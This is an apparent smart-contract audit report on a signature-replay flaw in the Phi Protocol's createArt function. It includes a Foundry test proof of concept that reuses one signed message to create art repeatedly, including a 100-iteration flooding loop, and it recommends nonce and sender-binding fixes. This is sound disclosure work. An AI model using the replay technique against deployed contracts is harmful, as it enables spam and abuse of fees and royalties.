# Vulnerability details

## Impact
This vulnerability allows multiple art pieces to be created for the same credential (cred) using a single valid signed message, as long as it's within the expiry date. The impact of this issue is significant:

1. System Flooding: Malicious actors can create an unlimited number of art pieces for a single credential, potentially overwhelming the system and user interfaces.

2. Artist Revenue Dilution: While the individual art pieces may not have specific monetary value, artists receive fees and royalties for their work. The ability to create unlimited art pieces could dilute these earnings across a larger pool of NFTs.

3. User Experience Degradation: An excessive number of art pieces for a single credential can confuse users and make it difficult to identify or value authentic or original works.

4. Resource Consumption: Unlimited creation of art pieces could lead to unnecessary consumption of blockchain resources and storage.

5. Potential for Market Manipulation: Bad actors could flood the market with numerous versions of the same credential art, potentially manipulating perceived scarcity or value.

While this issue doesn't directly impact the intrinsic value of the art pieces (as they are primarily for collection), it undermines the integrity of the Phi Protocol system and could negatively affect user trust and engagement.

## Proof of Concept
This POC demonstrates how anyone can create multiple art pieces using the same signature data, even after a legitimate art creator has used it.

1. Add the test to the `TestPhiFactory` contract in `test/PhiFactory.t.sol`.
2. Run `forge test --mt test_ReuseArtCreateSig`.

```js
function test_ReuseArtCreateSig() public {
    bytes memory credData = abi.encode(1, owner, "SIGNATURE", 31_337, bytes32(0));
    bytes memory signCreateData = abi.encode(expiresIn, "abc", credData);
    bytes32 createMsgHash = keccak256(signCreateData);
    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

    IPhiFactory.CreateConfig memory config =
                        IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);

    // legit art creator
    vm.prank(artCreator);
    vm.deal(artCreator, 1 ether);
    phiFactory.createArt{value: NFT_ART_CREATE_FEE}(signCreateData, abi.encodePacked(cr, cs), config);

    // anyone can create arts by using same signed
    vm.deal(user1, NFT_ART_CREATE_FEE);
    vm.prank(user1);
    phiFactory.createArt{value: NFT_ART_CREATE_FEE}(signCreateData, abi.encodePacked(cr, cs), config);

    // even they can change the config and create arts
    IPhiFactory.CreateConfig memory config2 =
                        IPhiFactory.CreateConfig(address(0), address(0), END_TIME, START_TIME, 0, 0, false);
    vm.deal(user2, NFT_ART_CREATE_FEE);
    vm.prank(user2);
    phiFactory.createArt{value: NFT_ART_CREATE_FEE}(signCreateData, abi.encodePacked(cr, cs), config2);

    // and malicious user can flood the cred with miss use of the sign data
    vm.deal(anyone, NFT_ART_CREATE_FEE * 100);
    for (uint i = 0; i < 100; i++) {
        vm.prank(anyone);
        phiFactory.createArt{value: NFT_ART_CREATE_FEE}(signCreateData, abi.encodePacked(cr, cs), config);
    }
}
```

## Recommended Mitigation Steps
1. Implement a Nonce System: 
   - Include a unique nonce in the signed message for each art creation.
   - Store used nonces and reject any attempts to reuse a nonce.

2. Validate Art Creator:
   - Include the `msg.sender` (art creator's address) in the signed message.
   - Verify that the current `msg.sender` matches the address in the signed data.
